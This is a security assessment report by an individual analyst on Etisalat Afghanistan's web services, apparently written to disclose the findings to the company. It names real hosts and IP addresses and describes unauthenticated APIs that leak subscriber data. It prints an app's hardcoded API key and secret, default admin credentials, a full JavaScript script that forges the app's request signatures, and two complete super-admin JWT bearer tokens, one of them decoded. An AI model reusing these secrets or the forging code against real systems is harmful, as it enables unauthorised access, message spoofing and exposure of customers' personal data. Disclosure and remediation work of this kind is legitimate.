# Security Assessment Report

## ✏️ Overview

<aside>
🗒️ **Name**

Etisalat Afghanistan web services security assessment

</aside>

<aside>
📅 **Time Frame**

7 May 2024 - 9 May 2024

</aside>

<aside>
🎯 **Goal**

Identify and document as many vulnerabilities as possible within the web services

</aside>

<aside>
📝 **Description**

This security assessment aimed to identify vulnerabilities within the main domain web services of Etisalat Afghanistan, as well as other web resources owned by the organization. Throughout the assessment, the primary objective was to uncover vulnerabilities and misconfigurations that could potentially impact a large user base, with the goal of mitigating risks that could affect as many users as possible.

The assessment took place between May 7th and May 9th, 2024. Throughout this period, various exploitation techniques were employed to evaluate all publicly accessible web services operated by Etisalat.

</aside>

<aside>
📝 **Domains**

- etisalat.af
- montylocal.net
</aside>

## 🖥️ Services

| Domain/Subdomain | IP | Forward DNS | Technologies | Observations | Successful Attack Vector | Open Ports | Additional Notes |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| rbt-lp.apis.etisalat.af | 203.171.103.199 | rbt-lp.etisalat.af, rbt-lp-apis.etisalat.af
 | Java, Spring Boot, Swagger | Publicly Exposed Swagger API Docs which disclose important unauthenticated API endpoints of rbt-admin-api |  | 443,8010 | Please prioritize patching as this can have really high exploitation impact |  |
| dscm.etisalat.af | 203.171.103.194 |  | Apache Tomcat | Exposed Private EA MPOS APK, broken request signing process | Customer Signature Reverse Engineering, Exposed confidential data | 8089 |  |  |
| sdp-porta-dev.montylocal.net | 172.104.255.134 | rbt-sub-eaf-vasdev.montylocal.net, rbt-h3i-portal-vasdev.montylocal.net, sdp-admin.montylocal.net, keycloak.vasdev.montylocal.net, vas-configuration.montylocal.net, ... | K8S | Default credentials
user: admin
password: admin  | Can be abused to send USSD response Messages, and normal text messages on behalf of Etisalat service accounts like 202 & … | 80,443 |  |  |
| eaf-rbt-middleware-api-vasqa.montylocal.net | 192.46.238.37 | * | Java, Spring Boot | Java JVM Heap dump exposed via Spring Boot, SpringBoot-actuator available-endpoints |  | 80,443 | exposed HeapDump is considered as a high-critical vulnerability for the spring boot application, it can contain API Keys, user credentials, SSH Keys and other sensitive information |  |

### [**rbt-lp-apis.etisalat.af**](https://rbt-lp-apis.etisalat.af/swagger-ui.html)

while assessing [rbt-lp-apis.etisalat.af](http://rbt-lp-apis.etisalat.af) i found out that the `api` service have a swagger API documentation endpoints `/swagger-ui.html`,`/swagger-resources` which contains the `rbt-admin-api` `api` endpoints.

![Untitled](Security%20Assessment%20Report%20d9773f8dda354bcb97ae0e1c17443ee4/Untitled.png)

[api-docs.xht](Security%20Assessment%20Report%20d9773f8dda354bcb97ae0e1c17443ee4/api-docs.xht)

upon further analysis of the endpoints exposed through `api` documentations I figured out that none of these API endpoints [`https://rbt-lp-apis.etisalat.af/](https://rbt-lp-apis.etisalat.af/)*` requires any kind of authentication and they are all publicly accessible without any form of authentication.

These exposed endpoints can be abused by uploading a custom audio file through a https `PUT` request at **`/tones/ringing`** and the approving it through request to `/tones/activate-published` endpoint and then mass assigning that RBT tone to millions of Etisalat customers using `subscribers/{msisdn}/tones` endpoint of the same API server

[`https://rbt-lp-apis.etisalat.af/swagger-ui.html#/subscriber-tone-controller/buyToneUsingPOST_1`](https://rbt-lp-apis.etisalat.af/swagger-ui.html#/subscriber-tone-controller/buyToneUsingPOST_1)

![Untitled](Security%20Assessment%20Report%20d9773f8dda354bcb97ae0e1c17443ee4/Untitled%201.png)

Malicious exploiting of this functionality can cause huge reputation and legal issues for Etisalat Afghanistan can even be abused for the anti-government propaganda which can have really bad consequences for Etisalat Afghanistan.

I didn’t do a full POC of this exploit due to the legal concerns but in a limited scale I could have successfully activate a Custom RBT tone through these API endpoints for my own Etisalat phone numbers without any kind of approval/verification from my SIM side just by using these API endpoints.

There are some other endpoints like `/subscribers/all` and … endpoints which leaks PII of Etisalat Afghanistan including their phone numbers, here I have attached an example of the response data from these endpoints.
 

[150000-200000.json](Security%20Assessment%20Report%20d9773f8dda354bcb97ae0e1c17443ee4/150000-200000.json)

### **dscm.etisalat.af**

Through analysis of this host I found out this specific endpoint which publicly downloads an APK file [`https://socialmedia.etisalat.af:8089/appversion/ETA_DSCM_1.0.9_20240311_172107_product.apk`](https://socialmedia.etisalat.af:8089/appversion/ETA_DSCM_1.0.9_20240311_172107_product.apk) upon further analysis of this APK i figured out that this is a private mobile Application which is only used by Etisalat Afghanistan Agents and shouldn’t be publicly available for everyone.

After revering engineering and other analysis which i performed on this API I found out that these two hardcoded API keys which was loaded through XML static strings of one of the main java classes of the app

```jsx
<string name="DIAppKey">b5d58f6a1930e2c89322fc3f51adef5d</string>
<string name="DIAppSecret">b7f65e20569931ce868846e291f9aa3d</string>
```

![Untitled](Security%20Assessment%20Report%20d9773f8dda354bcb97ae0e1c17443ee4/Untitled%202.png)

I installed the APK on a mobile emulator and analyzed the requests which it sending the the backend API server.
These requests contained a custom http header called `signcode`

![Untitled](Security%20Assessment%20Report%20d9773f8dda354bcb97ae0e1c17443ee4/Untitled%203.png)

Without proper `signcode` you can’t craft a custom HTTP request or modify any http request using a proxy like BRUP, the server will not accept a request without a proper `signcode` signature, the `signcode` signature is properly implemented in the app 

From the reverse engineered APK i could figure out the `signcode` generation is not properly implemented and you can generated your own arbitrary `signcode` to send arbitrary malicious HTTP request to the server of this Application

While the request is being crafted from the mobile application

![Untitled](Security%20Assessment%20Report%20d9773f8dda354bcb97ae0e1c17443ee4/Untitled%204.png)

There is this function `I` being called for generating the `signcode` 
This is the implementation of the obfuscated function `I` in the app 

```
function I(e, t, n, o) {
	var l = '';
	if (t.startsWith('/api') && (t = t.replace(/^\/api/, '')), 'get' === e || 'GET' === e) {
		var s = '' + t, f = [];
		if (n) {
			for (var c in n)
				f.push(c + '=' + n[c]);
			s = s + '?' + f.join('&');
		}
		var u = '' + s;
		l = (0, r(d[10]).SHA256)('' + u + (o || '') + '32BytesString').toString();
	} else {
		var p = '';
		n && (p = (p = (p = JSON.stringify(n || {})).replace(/[^a-zA-Z\d]/g, '')).replace(/null/g, '')), l = (0, r(d[10]).SHA256)('' + t + p + (o || '') + '32BytesString').toString();
	}
	return l;
}
```

It’s supposed to get 4 parameters e,t,n,o these parameters are `method, endpoint, params, token` 
I figured out the value for the last parameter `o` which should be a `token` is null in the application and you can call this function with your own arbitrary http method, api endpoint, parameter of the request with a null value for the token and craft a valid `signcode` for your request.

Here is my own version of that `I` function which i can generate `signcode` for my arbitrary requests for the server using it and it will be accepted as a valid request by the API server of this API

 

```
var CryptoJS = require("crypto-js");

function generateSignature(httpMethod, endpoint, parameters, token) {
    var signature = '';

    // Remove '/api' from the start of the endpoint if it exists
    if (endpoint.startsWith('/api')) {
        endpoint = endpoint.replace(/^\/api/, '');
    }

    if (httpMethod === 'GET' || httpMethod === 'get') {
        var queryString = endpoint;
        var paramArray = [];

        // Construct the query string from the parameters
        if (parameters) {
            for (var key in parameters) {
                paramArray.push(key + '=' + parameters[key]);
            }
            queryString = queryString + '?' + paramArray.join('&');
        }

        // Generate the SHA256 hash
        signature = CryptoJS.SHA256(queryString + (token || '') + '32BytesString').toString();
    } else {
        var paramString = '';

        // Stringify the parameters, remove non-alphanumeric characters, and replace 'null' with ''
        if (parameters) {
            paramString = JSON.stringify(parameters).replace(/[^a-zA-Z\d]/g, '').replace(/null/g, '');
        }

        // Generate the SHA256 hash
        signature = CryptoJS.SHA256(endpoint + paramString + (token || '') + '32BytesString').toString();
    }

    return signature;
}

var httpMethod = 'GET';
var endpoint = '/api/common/getPerLoginConfigParamList';
var parameters = { paramCodes: 'DRM_WEB_HOME_URL'  };
var token;

var result = generateSignature(httpMethod, endpoint, parameters, token);
console.log(result);
```

Here is a list of the API endpoints of the server which can be attacked using above misconfiguration with combination of other issues

[endpoints.lst](Security%20Assessment%20Report%20d9773f8dda354bcb97ae0e1c17443ee4/endpoints.lst)

upon further exploitation of this host it can be abused to compromise the agents accounts who Log-In into this application.
I thought that i might need a legal consent for further testing of this due to the legal concerns 

### **sdp-portal-dev.montylocal.net**

This development endpoint owned by Etisalat Afghanistan on `montylocal.net` domain is accessible with weak default credentials `admin:admin` and seems to contain juicy information and functionality 

![Untitled (1).png](Security%20Assessment%20Report%20d9773f8dda354bcb97ae0e1c17443ee4/Untitled_(1).png)

[Campaign.pdf](Security%20Assessment%20Report%20d9773f8dda354bcb97ae0e1c17443ee4/Campaign.pdf)

### [**eaf-rbt-middleware-api-vasqa.montylocal.net**](http://eaf-rbt-middleware-api-vasqa.montylocal.net/)

This host which seems to be relevant to [rbt-lp-apis.etisalat.af](http://rbt-lp-apis.etisalat.af) is a JAVA Spring Boot web application, the application is in the development mode which exposes a few extra framework endpoints, these are meant to only on during the development phase of the application while the app is still in development in a local environment but still seems to be enable on this host in the deployment phase

![Untitled.png](Supporting%20assets%20for%20the%20assessment%20report%201dc3f3fa47d04bf386f1f72d5e2202db/Untitled.png)

The most interesting of these endpoints is `/actuator/heapdump` endpoints which according to the official documentation:

> The `heapdump` endpoint provides a heap dump from the application’s JVM.
> 

It contains the `heapdump` of the Java JVM of the server of this application, a `heapdump` of a JVM machine can contains all different kind of sensitive information including, API Keys, SSH Keys, User credentials and other types of Users PII

I opened an analyzed the `HeapDump` downloaded for this endpoint using `visualvm` which is a tool developed for analysis of these `heapdump` files and extracted a bunch of `super-admin` account JWT token out of it, i didn’t spend much time on analysis of this but it might contains other kinds of secret information too.

[VisualVM: Home](https://visualvm.github.io/)

![Screenshot 2024-05-08 222107.png](Security%20Assessment%20Report%20d9773f8dda354bcb97ae0e1c17443ee4/Screenshot_2024-05-08_222107.png)

```jsx
Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImVjNTFjN2YwLTJmZmQtNGNmNi1hMGJkLWMxNzE1ODdjZmFjMyJ9.eyJ0ZW5hbnRLZXkiOiJlYzUxYzdmMC0yZmZkLTRjZjYtYTBiZC1jMTcxNTg3Y2ZhYzMiLCJob3N0IjoiMTQzLjQyLjMxLjE5OjQ5MjUwIiwidHlwZSI6IkxvZ2luIiwiVG9rZW5JZGVudGlmaWVyIjoiM2E5NzNhMDQtYWFjMC00YmRlLTg4OTctY2ZhNjUwN2ZkZWUwIiwibmJmIjoxNzE1MTU2MjYwLCJleHAiOjE3MTUxNTgwNjAsImlzcyI6IklkZW50aXR5IiwiYXVkIjoiUkJUIn0.-IZgD90jbsA_EEQbCCn-bWhf0zuUJVZ5E6N7etWgzp0
```

```jsx
Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImVjNTFjN2YwLTJmZmQtNGNmNi1hMGJkLWMxNzE1ODdjZmFjMyJ9.eyJuYmYiOjE3MTUxNTc4MzYsImV4cCI6MTcxNTE1OTYzNiwiaXNzIjoiSWRlbnRpdHkiLCJhdWQiOiJSQlQiLCJ1c2VyX25hbWUiOiJFUkJUX1N1cGVyQWRtaW4iLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiRVJCVF9TdXBlckFkbWluIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlN1cGVyQWRtaW4iXSwicm9sZXMiOlsiU3VwZXJBZG1pbiJdLCJjbGllbnRfaWQiOiJFdGlzYWxhdC1SQlQiLCJ0ZW5hbnRfa2V5IjoiZWM1MWM3ZjAtMmZmZC00Y2Y2LWEwYmQtYzE3MTU4N2NmYWMzIiwiaG9zdCI6IjE0My40Mi4zMS4xOTo2MDI1NCIsInR5cGUiOiJBY2Nlc3MiLCJsYW5ndWFnZSI6ImVuIiwiRXhwaXJlZFBhc3N3b3JkIjpmYWxzZSwicGFnZXMiOnsic2lkZUJhciI6W3sicGFnZUlkIjoxMTI0OSwibmFtZSI6IlJvbGVzIiwicGF0aCI6InJvbGVzIiwiaWNvbiI6ImZsYWciLCJwYXJlbnRfcGFnZV9uYW1lIjoiIn0seyJwYWdlSWQiOjExMjUwLCJuYW1lIjoiRGFzaGJvYXJkIiwicGF0aCI6ImRhc2hib2FyZCIsImljb24iOiJ0aCIsInBhcmVudF9wYWdlX25hbWUiOiIifSx7InBhZ2VJZCI6MTEyNTMsIm5hbWUiOiJSQlQgTWFuYWdlbWVudCIsInBhdGgiOiJyYnQtbWFuYWdlbWVudCIsImljb24iOiJyaW5nIiwicGFyZW50X3BhZ2VfbmFtZSI6IiJ9LHsicGFnZUlkIjoxMTI1MSwibmFtZSI6IlN5c3RlbSBBY2NvdW50cyIsInBhdGgiOiJzeXN0ZW0tYWNjb3VudHMiLCJpY29uIjoidXNlci1mcmllbmRzIiwicGFyZW50X3BhZ2VfbmFtZSI6IiJ9LHsicGFnZUlkIjoxMTI1NCwibmFtZSI6Ik92ZXJyaWRlIFRvbmUiLCJwYXRoIjoib3ZlcnJpZGUtdG9uZSIsImljb24iOiJiZWxsIiwicGFyZW50X3BhZ2VfbmFtZSI6IlJCVCBNYW5hZ2VtZW50In0seyJwYWdlSWQiOjExMjU3LCJuYW1lIjoiTWFuYWdlIENvbnRlbnQgUHJvdmlkZXJzIiwicGF0aCI6Im1hbmFnZS1jb250ZW50LXByb3ZpZGVycyIsImljb24iOiJjb2ciLCJwYXJlbnRfcGFnZV9uYW1lIjoiUkJUIE1hbmFnZW1lbnQifSx7InBhZ2VJZCI6MTEyNjAsIm5hbWUiOiJCbGFja2xpc3QiLCJwYXRoIjoibWFuYWdlLWJsYWNrbGlzdCIsImljb24iOiJjaGFsa2JvYXJkLXRlYWNoZXIiLCJwYXJlbnRfcGFnZV9uYW1lIjoiIn0seyJwYWdlSWQiOjExMjYxLCJuYW1lIjoiQ29weSBQcm9tcHQgQmxhY2tsaXN0ZWQiLCJwYXRoIjoiY29weS1wcm9tcHQtYmxhY2tsaXN0ZWQiLCJpY29uIjoiY2hhbGtib2FyZC10ZWFjaGVyIiwicGFyZW50X3BhZ2VfbmFtZSI6IkJsYWNrbGlzdCJ9LHsicGFnZUlkIjoxMTI2MiwibmFtZSI6IlJCVCBCbGFja2xpc3QiLCJwYXRoIjoibWFuYWdlLWJsYWNrbGlzdCIsImljb24iOiJjaGFsa2JvYXJkLXRlYWNoZXIiLCJwYXJlbnRfcGFnZV9uYW1lIjoiQmxhY2tsaXN0In0seyJwYWdlSWQiOjExMjYzLCJuYW1lIjoiQ2FsbGVyIEhhbmd1cCBTTVMgQmxhY2tsaXN0IiwicGF0aCI6ImNhbGxlci1oYW5nLXVwLXNtcyIsImljb24iOiJwaG9uZSIsInBhcmVudF9wYWdlX25hbWUiOiJCbGFja2xpc3QifSx7InBhZ2VJZCI6MTEyODQsIm5hbWUiOiJIYW5nIHVwIEJsYWNrbGlzdGVkIiwicGF0aCI6ImhhbmctdXAtYmxhY2tsaXN0ZWQiLCJpY29uIjoiY2hhbGtib2FyZC10ZWFjaGVyIiwicGFyZW50X3BhZ2VfbmFtZSI6IkJsYWNrbGlzdCJ9LHsicGFnZUlkIjoxMTI2NCwibmFtZSI6IlVzZXIgTG9nZ2luZyIsInBhdGgiOiJ1c2VyLWxvZ2dpbmciLCJpY29uIjoid3JlbmNoIiwicGFyZW50X3BhZ2VfbmFtZSI6IiJ9LHsicGFnZUlkIjoxMTI2NiwibmFtZSI6IkN1c3RvbWVyIExvZ3MiLCJwYXRoIjoiY3VzdG9tZXItbG9ncyIsImljb24iOiJmaWxlLWFsdCIsInBhcmVudF9wYWdlX25hbWUiOiIifSx7InBhZ2VJZCI6MTEyNjcsIm5hbWUiOiJDb25maWd1cmF0aW9uIiwicGF0aCI6Im1hbmFnZS1jb250ZW50LXByb3ZpZGVycyIsImljb24iOiJ1c2VyLWNvZyIsInBhcmVudF9wYWdlX25hbWUiOiIifSx7InBhZ2VJZCI6MTEyNjgsIm5hbWUiOiJSQlQgU2VydmljZSBDb250cm9sIiwicGF0aCI6InJidC1zZXJ2aWNlLWNvbnRyb2wiLCJpY29uIjoiY29ncyIsInBhcmVudF9wYWdlX25hbWUiOiJDb25maWd1cmF0aW9uIn0seyJwYWdlSWQiOjExMjc0LCJuYW1lIjoiVHJlbmR5IFJpbmd0b25lcyIsInBhdGgiOiJ0cmVuZHkiLCJpY29uIjoiZmlyZSIsInBhcmVudF9wYWdlX25hbWUiOiIifSx7InBhZ2VJZCI6MTEyNzUsIm5hbWUiOiJNYW5hZ2UgQ29ycG9yYXRlIiwicGF0aCI6Im1hbmFnZS1jb3Jwb3JhdGUiLCJpY29uIjoidXNlci10aWUiLCJwYXJlbnRfcGFnZV9uYW1lIjoiIn0seyJwYWdlSWQiOjExMjc2LCJuYW1lIjoiQ29ycG9yYXRlIE1hbmFnZW1lbnQiLCJwYXRoIjoiY29ycG9yYXRlLW1hbmFnZW1lbnQiLCJpY29uIjoidXNlcnMiLCJwYXJlbnRfcGFnZV9uYW1lIjoiTWFuYWdlIENvcnBvcmF0ZSJ9LHsicGFnZUlkIjoxMTI3NywibmFtZSI6IkNvcnBvcmF0ZSBUb25lIEludGVyZmFjZSIsInBhdGgiOiJjb3Jwb3JhdGUtdG9uZS1pbnRlcmZhY2UiLCJpY29uIjoibXVzaWMiLCJwYXJlbnRfcGFnZV9uYW1lIjoiTWFuYWdlIENvcnBvcmF0ZSJ9LHsicGFnZUlkIjoxMTI3OCwibmFtZSI6IkNvbnRlbnQgTWFuYWdlbWVudCIsInBhdGgiOiJjb250ZW50LW1hbmFnZW1lbnQiLCJpY29uIjoiZmlsZS1zaWduYXR1cmUiLCJwYXJlbnRfcGFnZV9uYW1lIjoiIn0seyJwYWdlSWQiOjExMjc5LCJuYW1lIjoiQXJ0aXN0IE1hbmFnZW1lbnQiLCJwYXRoIjoiYXJ0aXN0LW1hbmFnZW1lbnQiLCJpY29uIjoiZmlsZS1zaWduYXR1cmUiLCJwYXJlbnRfcGFnZV9uYW1lIjoiQ29udGVudCBNYW5hZ2VtZW50In0seyJwYWdlSWQiOjExMjgyLCJuYW1lIjoiUmluZ3RvbmUgQ2F0ZWdvcnkiLCJwYXRoIjoicmluZ3RvbmUtY2F0ZWdvcnkiLCJpY29uIjoiZmlsZS1zaWduYXR1cmUiLCJwYXJlbnRfcGFnZV9uYW1lIjoiQ29udGVudCBNYW5hZ2VtZW50In0seyJwYWdlSWQiOjExMjgzLCJuYW1lIjoiUmluZ3RvbmUgTWFuYWdlbWVudCIsInBhdGgiOiJyaW5ndG9uZS1tYW5hZ2VtZW50IiwiaWNvbiI6ImZpbGUtc2lnbmF0dXJlIiwicGFyZW50X3BhZ2VfbmFtZSI6IkNvbnRlbnQgTWFuYWdlbWVudCJ9LHsicGFnZUlkIjoxMTI5MiwibmFtZSI6Ik5hbWUgVHVuZSIsInBhdGgiOiJuYW1lLXR1bmUiLCJpY29uIjoibXVzaWMiLCJwYXJlbnRfcGFnZV9uYW1lIjoiIn1dLCJ0b3BCYXIiOltdfSwiVG9rZW5JZGVudGlmaWVyIjoiZmNmMGFjYWUtZjAwNS00ZjJjLWE5NWQtY2M3OWY1NTg0MzA2In0.KjvaS43-ADWWZIdAI8N-pOP1ve806Nkj6UP3Odux4Q0
```

Here is the payload of the second token

```jsx
{
  "nbf": 1715157836,
  "exp": 1715159636,
  "iss": "Identity",
  "aud": "RBT",
  "user_name": "ERBT_SuperAdmin",
  "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name": "ERBT_SuperAdmin",
  "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": [
    "SuperAdmin"
  ],
  "roles": [
    "SuperAdmin"
  ],
  "client_id": "Etisalat-RBT",
  "tenant_key": "ec51c7f0-2ffd-4cf6-a0bd-c171587cfac3",
  "host": "143.42.31.19:60254",
  "type": "Access",
  "language": "en",
  "ExpiredPassword": false,
  "pages": {
    "sideBar": [
      {
        "pageId": 11249,
        "name": "Roles",
        "path": "roles",
        "icon": "flag",
        "parent_page_name": ""
      },
      {
        "pageId": 11250,
        "name": "Dashboard",
        "path": "dashboard",
        "icon": "th",
        "parent_page_name": ""
      },
      {
        "pageId": 11253,
        "name": "RBT Management",
        "path": "rbt-management",
        "icon": "ring",
        "parent_page_name": ""
      },
      {
        "pageId": 11251,
        "name": "System Accounts",
        "path": "system-accounts",
        "icon": "user-friends",
        "parent_page_name": ""
      },
      {
        "pageId": 11254,
        "name": "Override Tone",
        "path": "override-tone",
        "icon": "bell",
        "parent_page_name": "RBT Management"
      },
      {
        "pageId": 11257,
        "name": "Manage Content Providers",
        "path": "manage-content-providers",
        "icon": "cog",
        "parent_page_name": "RBT Management"
      },
      {
        "pageId": 11260,
        "name": "Blacklist",
        "path": "manage-blacklist",
        "icon": "chalkboard-teacher",
        "parent_page_name": ""
      },
      {
        "pageId": 11261,
        "name": "Copy Prompt Blacklisted",
        "path": "copy-prompt-blacklisted",
        "icon": "chalkboard-teacher",
        "parent_page_name": "Blacklist"
      },
      {
        "pageId": 11262,
        "name": "RBT Blacklist",
        "path": "manage-blacklist",
        "icon": "chalkboard-teacher",
        "parent_page_name": "Blacklist"
      },
      {
        "pageId": 11263,
        "name": "Caller Hangup SMS Blacklist",
        "path": "caller-hang-up-sms",
        "icon": "phone",
        "parent_page_name": "Blacklist"
      },
      {
        "pageId": 11284,
        "name": "Hang up Blacklisted",
        "path": "hang-up-blacklisted",
        "icon": "chalkboard-teacher",
        "parent_page_name": "Blacklist"
      },
      {
        "pageId": 11264,
        "name": "User Logging",
        "path": "user-logging",
        "icon": "wrench",
        "parent_page_name": ""
      },
      {
        "pageId": 11266,
        "name": "Customer Logs",
        "path": "customer-logs",
        "icon": "file-alt",
        "parent_page_name": ""
      },
      {
        "pageId": 11267,
        "name": "Configuration",
        "path": "manage-content-providers",
        "icon": "user-cog",
        "parent_page_name": ""
      },
      {
        "pageId": 11268,
        "name": "RBT Service Control",
        "path": "rbt-service-control",
        "icon": "cogs",
        "parent_page_name": "Configuration"
      },
      {
        "pageId": 11274,
        "name": "Trendy Ringtones",
        "path": "trendy",
        "icon": "fire",
        "parent_page_name": ""
      },
      {
        "pageId": 11275,
        "name": "Manage Corporate",
        "path": "manage-corporate",
        "icon": "user-tie",
        "parent_page_name": ""
      },
      {
        "pageId": 11276,
        "name": "Corporate Management",
        "path": "corporate-management",
        "icon": "users",
        "parent_page_name": "Manage Corporate"
      },
      {
        "pageId": 11277,
        "name": "Corporate Tone Interface",
        "path": "corporate-tone-interface",
        "icon": "music",
        "parent_page_name": "Manage Corporate"
      },
      {
        "pageId": 11278,
        "name": "Content Management",
        "path": "content-management",
        "icon": "file-signature",
        "parent_page_name": ""
      },
      {
        "pageId": 11279,
        "name": "Artist Management",
        "path": "artist-management",
        "icon": "file-signature",
        "parent_page_name": "Content Management"
      },
      {
        "pageId": 11282,
        "name": "Ringtone Category",
        "path": "ringtone-category",
        "icon": "file-signature",
        "parent_page_name": "Content Management"
      },
      {
        "pageId": 11283,
        "name": "Ringtone Management",
        "path": "ringtone-management",
        "icon": "file-signature",
        "parent_page_name": "Content Management"
      },
      {
        "pageId": 11292,
        "name": "Name Tune",
        "path": "name-tune",
        "icon": "music",
        "parent_page_name": ""
      }
    ],
    "topBar": []
  },
  "TokenIdentifier": "fcf0acae-f005-4f2c-a95d-cc79f5584306"
}
```

It can be abused for further access and persistence inside this app

---

Incase you have questions and need more in-depth information/analysis based on this report you can reach out to me through my personal email address
sab00rhakimi@yahoo.com

Saboor Hakimi
Cyber Security Analyst